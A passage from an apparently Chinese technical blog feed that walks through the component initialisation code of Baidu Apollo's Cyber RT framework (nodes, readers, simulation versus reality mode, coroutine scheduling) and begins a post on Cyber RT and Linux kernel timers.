class="hljs-built_in">cyber_unlikely</span>(!is_reality_mode)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <span class="hljs-comment">// 创建 scheduler</span><br>  <span class="hljs-keyword">auto</span> sched = scheduler::<span class="hljs-built_in">Instance</span>();<br>  std::weak_ptr&lt;Component&lt;M0, M1&gt;&gt; self =<br>      std::dynamic_pointer_cast&lt;Component&lt;M0, M1&gt;&gt;(<span class="hljs-built_in">shared_from_this</span>());<br>  <span class="hljs-keyword">auto</span> func = [self](<span class="hljs-type">const</span> std::shared_ptr&lt;M0&gt;&amp; msg0, <span class="hljs-type">const</span> std::shared_ptr&lt;M1&gt;&amp; msg1) &#123;<br>    <span class="hljs-keyword">auto</span> ptr = self.<span class="hljs-built_in">lock</span>();<br>    <span class="hljs-keyword">if</span> (ptr) &#123;<br>      ptr-&gt;<span class="hljs-built_in">Process</span>(msg0, msg1);<br>    &#125; <span class="hljs-keyword">else</span> <br>         <span class="hljs-comment">/*  错误处理  */</span><br>  &#125;;<br>  <span class="hljs-comment">// 创建 DataVisitor 和 RoutineFactory   最后创建任务</span><br>  std::vector&lt;data::VisitorConfig&gt; config_list;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; reader : readers_)<br>    config_list.<span class="hljs-built_in">emplace_back</span>(reader-&gt;<span class="hljs-built_in">ChannelId</span>(), reader-&gt;<span class="hljs-built_in">PendingQueueSize</span>());<br>  <span class="hljs-keyword">auto</span> dv = std::make_shared&lt;data::DataVisitor&lt;M0, M1&gt;&gt;(config_list);<br>  croutine::RoutineFactory factory = croutine::<span class="hljs-built_in">CreateRoutineFactory</span>&lt;M0, M1&gt;(func, dv);<br>  <span class="hljs-keyword">return</span> sched-&gt;<span class="hljs-built_in">CreateTask</span>(factory, node_-&gt;<span class="hljs-built_in">Name</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>不得不承认，初始化的过程复杂度超乎我的想象。看完代码，你应该明白之前的只言片语只是对这一复杂过程的笼统概括😅。接下来，我还需要对上述过程中提到的术语做一些解释。<strong>如果你不想看这些繁杂的细节，可以直接跳过</strong>。</p><h3 id="Node-节点">Node 节点</h3><p>在 <code>Initialize()</code> 函数一开始，<code>Component</code> 类就创建了 <code>Node</code> 类对象。那么什么是 <code>Node</code> 类？根据官方文档给出的解释<sup>3</sup>，<code>Node</code> 节点类是 Cyber RT 的基本组成部分；每个 <code>Component</code> 对象都包含一个节点，可通过节点进行通信。通过定义节点中的 read/write 和/或 service/client，模块可以具有不同类型的通信模式。<code>Node</code> 对象负责创建 <code>Reader</code> 、<code>Writer</code> 、<code>Service</code> 、<code>Client</code> <strong>信道对象</strong>来帮该组件获取或传输信息。</p><p>这么说好像有点抽象？那我们再来看一下上文的类继承图以及下面的代码块。从类成员的角度看，<code>Node</code> 对象有</p><ul><li><code>std::string node_name_</code> 它的名字</li><li><code>std::string name_space_</code>命名空间</li><li><code>map&lt;string, ReaderBase&gt;</code> 类型的 <code>readers_</code> ，它其实就是一个表格，负责保存信道名字 <code>channel_name</code> 与对应的 <code>Reader</code> 读者对象</li><li>一个 <code>NodeChannelImpl</code> 指针。 <code>NodeChannelImpl</code> 类是 <code>Node</code> 用来创建与信道相关的 <code>Reader</code> 和 <code>Writer</code> 对象的类，在真实模式下（下文会介绍），创建的对象是 <code>Reader</code> 和 <code>Writer</code>，而在模拟模式下，创建的是 <code>IntraReader</code> 、<code>IntraWriter</code> 对象，创建后向通信拓扑注册当前节点</li><li>一个 <code>NodeServiceImpl</code> 指针。和<code>NodeChannelImpl</code>类似，只不过它创建的是 <code>Service</code> 和 <code>Client</code> 对象，创建后也会注册 <code>service</code></li><li>上面提到的两个指针，都指向创建之前提到的四种信道对象的<strong>创建器</strong></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M0, <span class="hljs-keyword">typename</span> M1, <span class="hljs-keyword">typename</span> M2, <span class="hljs-keyword">typename</span> M3&gt;<br>    <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Component</span>;<br>    <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimerComponent</span>;<br> <span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Node</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; node_name,</span></span><br><span class="hljs-params"><span class="hljs-function">                <span class="hljs-type">const</span> std::string&amp; name_space = <span class="hljs-string">&quot;&quot;</span>)</span></span>;<br><br>    std::string node_name_;<br>    std::string name_space_;<br>    <br>    std::map&lt;std::string, std::shared_ptr&lt;ReaderBase&gt;&gt; readers_;<br>    std::unique_ptr&lt;NodeChannelImpl&gt; node_channel_impl_ = <span class="hljs-literal">nullptr</span>;<br>    std::unique_ptr&lt;NodeServiceImpl&gt; node_service_impl_ = <span class="hljs-literal">nullptr</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>回到 <code>Initialize()</code> 函数，<code>Node</code> 类创建完后，其主要任务就是创建读者信道：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">reader0 = node_-&gt;<span class="hljs-keyword">template</span> <span class="hljs-built_in">CreateReader</span>&lt;M0&gt;(reader_cfg, func);<br></code></pre></td></tr></table></figure><h3 id="信道与配置信息">信道与配置信息</h3><p>接下来的两步，读取配置文件和调用 <code>Init()</code> 函数都非常直白，我们直接来看读者信息的配置，或者说，看它配置了哪些读者信息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">ReaderConfig reader_cfg;<br>reader_cfg.channel_name = config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">channel</span>();<br>reader_cfg.qos_profile.<span class="hljs-built_in">CopyFrom</span>(config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">qos_profile</span>());<br>reader_cfg.pending_queue_size = config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">pending_queue_size</span>();<br></code></pre></td></tr></table></figure><p>一共三个变量被赋值（事实上 <code>ReaderConfig</code> 也只有这三个变量）</p><ul><li><code>string channel_name</code> 信道的名字。要求信道的名字不能重复</li><li><code>QosProfile qos_profile</code> <a href="https://baike.baidu.com/item/QoS">qos</a> 属性，通信的服务质量</li><li><code>uint32_t pending_queue_size</code> 信道缓冲区的长度，如果溢出了，会丢弃较早的消息</li></ul><p>在真实模式（下文会提到）中，会调用 <code>node_-&gt;template CreateReader&lt;M1&gt;(reader_cfg)</code> 创建一个 <code>Reader</code> 对象，不加入激活函数。而若要仔细检视如何创建 <code>Reader</code> 对象，需要看一下 <code>Node Channel Impl::CreateReader</code> 。这里简单说一下，主要步骤有：</p><ol><li>设定 RoleAttribute 的相关信息，包括信道名字，qos_file ，host_id，node_id 等等</li><li>将新的属性（Attr），激活函数和缓冲区大小作为参数，构造出 <code>Reader&lt;MessageT&gt;</code> 的对象</li></ol><p>当然，这里面的故事还没有结束，如果有时间的话，可以进一步研究一下 Cyber RT 的通信模式。</p><h3 id="真实模式与模拟模式">真实模式与模拟模式</h3><p>接下来，解决一下 <code>is_reality_mode</code> 的问题。通过 <code>GlobalData::Instance()-&gt;IsRealityMode()</code> 猜测，它是一个全局数据，再进一步调查发现，它只有两个值：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">RunMode</span> &#123;<br>  MODE_REALITY = <span class="hljs-number">0</span>;<br>  MODE_SIMULATION = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么，什么时候它是 reality，什么时候是 simulation 呢？一般来说，simulation 模式多用于测试，多出现在测试文件中。其默认值为 reality 模式，但如果在测试文件（_test.cc）中，调用了如下函数，就会切换为<strong>模拟模式</strong>(simulation 模式）。而 reality 模式，即<strong>真实模式</strong>，根据我的理解，可能就是在系统真实运作、控制自动驾驶系统时的运行模式。在真实模式下，初始化工作非常的明确：为每个信道创建一个 <code>Reader</code>，然后创建回调函数用于调用 <code>Process()</code>，最后创建出对应的协程，让 <code>Scheduler</code> 来运行管理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GlobalData::EnableSimulationMode</span><span class="hljs-params">()</span> </span>&#123;<br>  run_mode_ = RunMode::MODE_SIMULATION;<br>&#125;<br></code></pre></td></tr></table></figure><p>模拟模式与真实模式的最大差别就是，数据来源不是真实传感器实时获取的数据了。那么，模拟模式的数据从哪获得呢？在代码中，模拟模式的信道由 <code>IntraReader</code> 和 <code>IntraWriter</code> 类实现，这些类获取的数据也不是从协程中获得，而是通过 <code>Blocker</code> 类获得模拟数据（或历史数据）。为方便说明，把 <code>Component::Initialize()</code> 函数的模拟模式部分截取过来👇：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (is_reality_mode) &#123;<br>    <span class="hljs-comment">// ...</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>std::weak_ptr&lt;Component&lt;M0, M1&gt;&gt; self =<br>        std::dynamic_pointer_cast&lt;Component&lt;M0, M1&gt;&gt;(<span class="hljs-built_in">shared_from_this</span>());<br>    <span class="hljs-keyword">auto</span> blocker1 = blocker::BlockerManager::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">GetBlocker</span>&lt;M1&gt;(<br>        config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">channel</span>());<br>    <span class="hljs-comment">// 特殊的回调函数</span><br>    <span class="hljs-keyword">auto</span> func = [self, blocker1](<span class="hljs-type">const</span> std::shared_ptr&lt;M0&gt;&amp; msg0) &#123;<br>      <span class="hljs-keyword">auto</span> ptr = self.<span class="hljs-built_in">lock</span>();<br>      <span class="hljs-keyword">if</span> (ptr) &#123;<br>        <span class="hljs-keyword">if</span> (!blocker1-&gt;<span class="hljs-built_in">IsPublishedEmpty</span>()) &#123;<br>          <span class="hljs-keyword">auto</span> msg1 = blocker1-&gt;<span class="hljs-built_in">GetLatestPublishedPtr</span>();<br>          ptr-&gt;<span class="hljs-built_in">Process</span>(msg0, msg1);<br>        &#125;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        AERROR &lt;&lt; <span class="hljs-string">&quot;Component object has been destroyed.&quot;</span>;<br>      &#125;<br>    &#125;;<br>    reader0 = node_-&gt;<span class="hljs-keyword">template</span> <span class="hljs-built_in">CreateReader</span>&lt;M0&gt;(reader_cfg, func);<br>&#125;<br><br>NodeChannelImpl::<span class="hljs-built_in">CreateReader</span>() &#123;<br>    <span class="hljs-comment">// ....</span><br>    <span class="hljs-keyword">if</span> (!is_reality_mode_) &#123;<br>    reader_ptr =<br>        std::make_shared&lt;blocker::IntraReader&lt;MessageT&gt;&gt;(new_attr, reader_func);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，<strong>在模拟模式下</strong>，如果有 n 个信道（这里 n = 2），初始化程序会先给后 n-1 个信道创建 <code>IntraReader</code> 对象（日后我们再讨论这些东西），然后对于 <code>Reader&lt;M0&gt;</code> 信道，它会创建一个特殊的回调函数，该回调函数的基本情况如下：</p><ul><li>在信道 0 接收到消息时触发</li><li>触发时，函数会从其他 n-1 个信道的 <code>IntraReader</code> 的 <code>Blocker::published_msg_queue_</code> 队列中各拿出 1 个消息，并把这些消息一起交给 <code>Process()</code> 函数执行</li><li>该函数在创建 <code>IntraReader</code> 对象时，就被当成参数传入，并在<code>IntraReader::init()</code> 中被注册到该 <code>Blocker</code> 对象内的回调函数表中（日后讨论+1）</li></ul><p>接下来看看初始化函数的最后一部分，我们现在<strong>只考虑真实模式</strong>，因为此部分代码只有在真实模式下进行。首先，获取了调度器单例对象，并建立的 <code>func</code> ，而 <code>func</code> 内容也很简单，就是在线程安全的前提下直接调用 <code>Porcess()</code> ，<code>Process()</code> 会调用用户自己定义的函数 <code>Proc()</code>，进而处理组件接收到的所有消息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> func = [self](<span class="hljs-type">const</span> std::shared_ptr&lt;M0&gt;&amp; msg0,<br>                     <span class="hljs-type">const</span> std::shared_ptr&lt;M1&gt;&amp; msg1) &#123;<br>    <span class="hljs-keyword">auto</span> ptr = self.<span class="hljs-built_in">lock</span>();<br>    <span class="hljs-keyword">if</span> (ptr) &#123;<br>      ptr-&gt;<span class="hljs-built_in">Process</span>(msg0, msg1);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      AERROR &lt;&lt; <span class="hljs-string">&quot;Component object has been destroyed.&quot;</span>;<br>    &#125;<br>  &#125;;<br></code></pre></td></tr></table></figure><p><code>func</code> 会被当做参数传给 <code>CRoutine::CreateRoutineFactory</code> ，看这名字就知道，该函数用于创建协程工厂（<a href="https://www.runoob.com/design-pattern/factory-pattern.html">工厂模式</a>），此外该函数还涉及了消息融合，数据访问和数据分发等等，我们先略过不说。复杂的代码理解不了，还是看一个简单点的代码吧：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Function&gt;<br><span class="hljs-function">RoutineFactory <span class="hljs-title">CreateRoutineFactory</span><span class="hljs-params">(Function&amp;&amp; f)</span> </span>&#123;<br>  RoutineFactory factory;<br>  factory.create_routine = [f = std::forward&lt;Function&amp;&amp;&gt;(f)]() &#123; <span class="hljs-keyword">return</span> f; &#125;;<br>  <span class="hljs-keyword">return</span> factory;<br>&#125;<br></code></pre></td></tr></table></figure><p>很简单的代码，只是设定了一下 <code>factory.create_routine</code>。在返回 <code>factory</code> 后，调用了 <code>Scheduler::CreateTask</code>。此后，又继续调用一个函数，注意：<code>CreateTask</code> 的第一个参数 <code>func</code> 就是在 <code>Component::Initialize()</code> 中创建的原函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Scheduler::CreateTask</span><span class="hljs-params">(<span class="hljs-type">const</span> RoutineFactory&amp; factory, <span class="hljs-type">const</span> std::string&amp; name)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">CreateTask</span>(factory.<span class="hljs-built_in">create_routine</span>(), name, factory.<span class="hljs-built_in">GetDataVisitor</span>());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Scheduler::CreateTask</span><span class="hljs-params">(std::function&lt;<span class="hljs-type">void</span>()&gt;&amp;&amp; func,</span></span><br><span class="hljs-params"><span class="hljs-function">                           <span class="hljs-type">const</span> std::string&amp; name,</span></span><br><span class="hljs-params"><span class="hljs-function">                           std::shared_ptr&lt;DataVisitorBase&gt; visitor)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">cyber_unlikely</span>(stop_.<span class="hljs-built_in">load</span>())) &#123;<br>      <span class="hljs-comment">/*  错误处理  */</span><br>  &#125;<br>  <span class="hljs-keyword">auto</span> task_id = GlobalData::<span class="hljs-built_in">RegisterTaskName</span>(name);<br>  <span class="hljs-keyword">auto</span> cr = std::<span class="hljs-built_in">make_shared</span>&lt;CRoutine&gt;(func);<span class="hljs-comment">// 看这里！！！！</span><br>  cr-&gt;<span class="hljs-built_in">set_id</span>(task_id);<br>  cr-&gt;<span class="hljs-built_in">set_name</span>(name);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DispatchTask</span>(cr))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">if</span> (visitor != <span class="hljs-literal">nullptr</span>) &#123;<br>    visitor-&gt;<span class="hljs-built_in">RegisterNotifyCallback</span>([<span class="hljs-keyword">this</span>, task_id]() &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">cyber_unlikely</span>(stop_.<span class="hljs-built_in">load</span>()))<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">NotifyProcessor</span>(task_id);<br>    &#125;);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>哇哈，终于抓住你了，看来 <code>Component::Initialize()</code> 中建立的 <code>func</code> ，最终会被 Cyber RT 用来创建一个协程。然后放入到 <code>Scheduler</code> 中，并根据我之前介绍的 <a href="https://dingfen.github.io/apollo/2020/10/17/Cyber-RT.html#processor">Cyber RT 调度策略</a>运行。在真实模式下，组件创建了一个特殊的回调函数，该函数对从信道接受来的消息进行处理。该函数最终会被封装为一个协程，并在 <code>Scheduler</code> 类的安排下执行。</p><h2 id="定时组件类">定时组件类</h2><p>定时组件类与组件类有所不同，它比组件类多了定时器，这部分内容我在 <a href="https://dingfen.github.io/apollo/2020/10/21/CyberTimer.html">Cyber RT 定时器</a>中已经提过，为了这篇博客的完整性，我再次强调一下。</p><p><code>Process()</code> 函数和组件类一样，平平无奇。重点看一下 <code>Initialize()</code> 函数</p><ol><li>创建 <code>Node</code> 类对象</li><li>读取配置文件</li><li>创建定时器对象，并开始计时</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TimerComponent::Initialize</span><span class="hljs-params">(<span class="hljs-type">const</span> TimerComponentConfig&amp; config)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (!config.<span class="hljs-built_in">has_name</span>() || !config.<span class="hljs-built_in">has_interval</span>()) &#123;<br><span class="hljs-comment">/* 错误处理 */</span><br>  &#125;<br>  node_.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Node</span>(config.<span class="hljs-built_in">name</span>()));<br>  <span class="hljs-built_in">LoadConfigFiles</span>(config);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Init</span>())<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  std::shared_ptr&lt;TimerComponent&gt; self =<br>      std::<span class="hljs-built_in">dynamic_pointer_cast</span>&lt;TimerComponent&gt;(<span class="hljs-built_in">shared_from_this</span>());<br>  <span class="hljs-keyword">auto</span> func = [self]() &#123; self-&gt;<span class="hljs-built_in">Proc</span>(); &#125;;<br>  timer_.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Timer</span>(config.<span class="hljs-built_in">interval</span>(), func, <span class="hljs-literal">false</span>));<br>  timer_-&gt;<span class="hljs-built_in">Start</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到，与组件类不同，定时组件类在 <code>Initialize()</code> 中没有创建任何的 <code>Reader</code> 读者，也没有搞出调度器、协程工厂、创建任务等一系列复杂的操作。你可能有这样的疑问：既然定时组件类并没有创建出任务和协程，那么定时组件类的处理函数需要如何被调用呢？<a href="https://dingfen.github.io/apollo/2020/10/21/CyberTimer.html">Cyber RT 定时器</a>中其实已经有解答了🤪。简单来说，所有的定时器会把任务全部交给时间轮处理，过一段时间后，当时间轮发现需要执行某些定时任务时，就会把它们全部取出，然后调用 <code>cyber::Async</code> 异步地执行。</p><h2 id="总结">总结</h2><p>今天我重点研究了组件类，分析了组件类的继承图关系以及它们的成员变量，并着重探究了组件类的初始化过程，进而对：信道与读者类、节点类与 <code>NodeChannelImpl</code> 类、调度器、数据访问类、协程、协程工厂函数等等有了一个大致的了解。</p><p>在组件类中，最重要的两个可调用函数就是 <code>Process()</code> 和 <code>Initialize()</code> ，然而用户不可以对它们直接进行更改，必须通过重载 <code>Proc()</code> 和 <code>Init()</code> 才能操控组件。对于如何创建一个组件类，官方的解释非常详细<sup>2</sup>。在对 <code>Initialize()</code> 函数的进一步的研究中，我发现在真实模式下，初始化工作主要有：为每个信道创建一个 <code>Reader</code> 对象，然后创建回调函数用于调用 <code>Process()</code>，最后创建出对应的协程，让 <code>Scheduler</code> 来运行管理，而在模拟模式下，数据主要是从 <code>Blocker</code> 类中取得的历史数据，而非感知器获得的真实数据。</p><p>我承认这篇博客很多地方没有解释很清楚，这一方面是因为篇幅限制，另一方面是因为我还未对 Cyber RT 理解透彻（尤其是通信部分），相信在课题组其他成员的帮助下，了解 Apollo 系统的真面目已经不远了。</p><h2 id="参考">参考</h2><p>[1] <a href="https://cyber-rt.readthedocs.io/en/latest/">Cyber RT Documents</a></p><p>[2] <a href="https://github.com/ApolloAuto/apollo/blob/master/docs/cyber/CyberRT_Quick_Start_cn.md">如何使用 Cyber RT 来创建一个新的组件</a></p><p>[3] <a href="https://cyber-rt.readthedocs.io/en/latest/CyberRT_Terms.html">Cyber RT Terms</a></p>]]></content>
    
    
    <categories>
      
      <category>Apollo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apollo</tag>
      
      <tag>Cyber RT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apollo Cyber RT 定时器</title>
    <link href="/2020/10/21/2020-10-21-CyberTimer/"/>
    <url>/2020/10/21/2020-10-21-CyberTimer/</url>
    
    <content type="html"><![CDATA[<h1>Apollo Cyber RT 定时器</h1><h2 id="前言">前言</h2><p>首先回顾一下之前的内容。<a href="https://apollo.auto/">Apollo</a> 是百度开发的自动驾驶开源框架，具有高性能和高灵活性的特点，我主要介绍 <a href="https://github.com/ApolloAuto/apollo">Apollo 5.5</a> 版本。Apollo Cyber RT 是 Apollo 团队在注意到 ROS 无法满足自动驾驶系统的鲁棒性和性能要求后，专门为自动驾驶场景设计的开源、高性能<strong>运行时框架</strong>。Cyber RT 的调度系统给出了两个调度策略，使用协程来处理任务，并以优先级为主要依据调度协程。</p><p>OK，介绍完 Apollo 自动驾驶系统和 Cyber RT 运行时框架的调度部分后，今天我来介绍一下 Cyber RT 的定时器。当然，本人水平有限，对搜寻的资料的概括和对代码的理解难免有些错误、遗漏，恳请大家讨论、指正。</p><h2 id="什么是定时器">什么是定时器</h2><p>在操作系统内核中，时间管理与定时器是重要的组成部分。相对于事件驱动而言，内核中有大量的函数都是基于时间驱动的，其中有些是周期性的，有些是等待一个相对时间后执行，有些是在绝对时间上执行。<strong>定时器</strong>是管理系统流逝的时间的基础，能够使工作在指定时间点上执行。</p><p>定时器的使用很简单，你只需要执行一些初始化工作，设置一个超时时间，指定超时后执行的函数，最后激活定时器就可以了。</p><h3 id="Linux-中的定时器">Linux 中的定时器</h3><p>为了给大家留下一个深刻的印象，我先拿如何使用 Linux 内核中的定时器来说明。Linux 的内核定时器定义在文件 <code>&lt;linux/timer.h&gt;</code> 中，其结构如下<sup>1</sup>（2.6 版本）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_list</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">entry</span>;</span><span class="hljs-comment">// 定时器链表的入口</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> expires;<span class="hljs-comment">// 以 jiffies 为单位的定时器</span><br>    <span class="hljs-type">void</span> *(function)(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>); <span class="hljs-comment">// 定时器处理函数</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> data;<span class="hljs-comment">// 传给处理函数的长整型参数</span><br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>首先，我们需要定义一个定时器变量，以创建定时器。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_list</span> <span class="hljs-title">my_timer</span>;</span><br></code></pre></td></tr></table></figure><p>接着需要通过一个辅助函数来初始化定时器内部的数值，初始化必须在使用其他定时器管理函数对定时器操作前完成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">init_timer(&amp;my_timer);<br></code></pre></td></tr></table></figure><p>然后，我们就可以设置数据结构中的值了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">my_timer.expires = jiffies + delay;<span class="hljs-comment">// 定时器超时时的节拍数</span><br>my_timer.data = <span class="hljs-number">0</span>;<span class="hljs-comment">// 给定时器处理函数传入 0 值</span><br>my_timer.function = my_function;<span class="hljs-comment">// 定时器超时时调用的函数</span><br></code></pre></td></tr></table></figure><p>只有当当前的 <code>jiffies</code> 值（全局变量，用来记录自系统启动以来产生的节拍总数）大于或等于 <code>my_timer.expires</code> 时，<code>my_timer.function </code>所指向的处理函数就会开始执行，当然函数还需要长整型参数 <code>my_timer.data</code> ，也就是说，处理函数必须符合以下原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">my_timer_function</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> data)</span>;<br></code></pre></td></tr></table></figure><p>最后，激活定时器。大功告成！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">add_timer(&amp;my_timer);<br></code></pre></td></tr></table></figure><p>需要特别注意到的是，Linux 系统中的实时调度算法，以及上面所说的定时器都是<strong>软实时</strong>的。所谓软实时，对于实时调度算法来说，就是指系统会尽可能使<strong>进程</strong>在它的限定时间到来前运行，但<strong>不保证</strong>总能满足这些进程的要求。对于定时器来讲，就是系统在指定时间到来后，可能会推迟定时器处理函数的执行。所以不能用它们来实现任何<strong>硬实时任务</strong>。</p><h2 id="定时器——算法与数据结构">定时器——算法与数据结构</h2><h3 id="双向链表">双向链表</h3><p>在 Linux 系统中，所有的定时器都以双向链表的形式存放在一起（<code>timer_list</code> 